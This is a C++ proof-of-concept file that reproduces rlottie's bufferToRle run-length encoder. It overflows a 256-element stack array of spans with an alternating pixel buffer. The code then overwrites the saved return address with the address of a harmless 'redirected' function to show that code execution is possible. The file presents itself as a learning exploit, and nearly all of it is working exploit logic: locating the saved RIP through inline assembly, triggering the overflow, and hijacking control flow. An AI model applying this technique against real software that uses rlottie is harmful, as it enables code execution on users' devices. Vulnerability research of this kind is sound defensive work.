

#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <cstdint>
#include <unistd.h>

using uchar  = unsigned char;
using ushort = unsigned short;

// ---- Exact VRle::Span from rlottie ----
struct Span {
    short  x{0};
    short  y{0};
    ushort len{0};
    uchar  coverage{0};
};

static size_t bufferToRle(uchar *buffer, int bufferLen, int size,
                          int offsetX, int y, Span *out)
{
    size_t count = 0;
    uchar  value = buffer[0];
    int    curIndex = 0;

    size = offsetX < 0 ? size + offsetX : size;
    if (size > bufferLen) {
        return count;
    }
    for (int i = 0; i < size; i++) {
        uchar curValue = buffer[0];
        if (value != curValue) {
            if (value) {
                out->y = y;
                out->x = offsetX + curIndex;
                out->len = i - curIndex;
                out->coverage = value;
                out++;
                count++;
            }
            curIndex = i;
            value = curValue;
        }
        buffer++;
    }
    if (value) {
        out->y = y;
        out->x = offsetX + curIndex;
        out->len = size - curIndex;
        out->coverage = value;
        count++;
    }
    return count;
}

__attribute__((noinline))
void redirected() {
    const char msg[] =
        "yooo redirected!!! \n";
    write(STDOUT_FILENO, msg, sizeof(msg) - 1);
    _Exit(0);
}

static volatile uintptr_t  g_target;      // address of redirected()
static volatile uintptr_t *g_rip_slot;    // address of saved RIP on stack
static uchar                g_array[1024]; // pixel buffer (also off-stack)

__attribute__((noinline))
static void do_overflow()
{
    Span temp[256];  // THE OVERFLOW TARGET — 2048 bytes on stack

    // Step 1: Save this function's return-address location to a GLOBAL
    //         BEFORE the overflow the stack.
    uintptr_t *rbp_ptr;
    asm volatile("mov %%rbp, %0" : "=r"(rbp_ptr));
    g_rip_slot = (volatile uintptr_t *)(rbp_ptr + 1);
    // rbp_ptr points to saved RBP; +1 (8 bytes) is saved RIP

    printf("  [*] temp[] at:          %p (%zu bytes)\n", (void*)temp, sizeof(Span) * 256);
    printf("  [*] Saved RIP slot at:  %p\n", (void*)g_rip_slot);
    printf("  [*] Distance:           %td bytes\n",
           (char*)(void*)g_rip_slot - (char*)temp);
    fflush(stdout);

    // Step 2: Overflow — bufferToRle writes ~585 spans into 256-capacity buffer
    //         This smashes temp[], saved RBP, saved RIP, and everything between.
    size_t count = bufferToRle(g_array, 1024, 1024, 0, 0x4141, temp);

    // Step 3: Patch the saved RIP with redirected()'s address.
    //         We use GLOBALS because every local variable is.
    //         g_rip_slot still points to the correct stack address.
    //         g_target still holds redirected()'s address.
    *g_rip_slot = g_target;

    printf("  [*] Spans produced:     %zu (capacity: 256)\n", count);
    printf("  [*] Overflow:           %zu spans = %zu bytes\n",
           count - 256, (count - 256) * sizeof(Span));
    printf("  [*] Patched saved RIP:  0x%016lx -> 0x%016lx (redirected)\n",
           0UL, (unsigned long)g_target);
    fflush(stdout);

    // Step 4: Function returns. The epilogue does:
    //   leave  →  mov %rbp,%rsp ; pop %rbp  (loads RBP, harmless)
    //   ret    →  pop saved_RIP into RIP    (loads our patched address!)
    //
    // Execution jumps to redirected(). QED.
}

int main()
{
    printf("\n=== rlottie bufferToRle -> Code Execution PoC ===\n\n");

    // Store target in global (safe from stack overflow)
    g_target = (uintptr_t)&redirected;
    printf("  Target: redirected() at 0x%016lx\n", (unsigned long)g_target);

    // Build alternating pixel buffer in global array
    for (int i = 0; i < 1024; i++)
        g_array[i] = (i & 1) ? 0xFF : 0x00;

    printf("  Input:  1024 bytes alternating [0x00, 0xFF]\n");
    printf("          (simulates XOR of two Lottie masks)\n\n");

    // Trigger the overflow!!! for learning purpose
    do_overflow();

    // Should never reach here
    printf("  ERROR: do_overflow() returned normally\n");
    return 1;
}
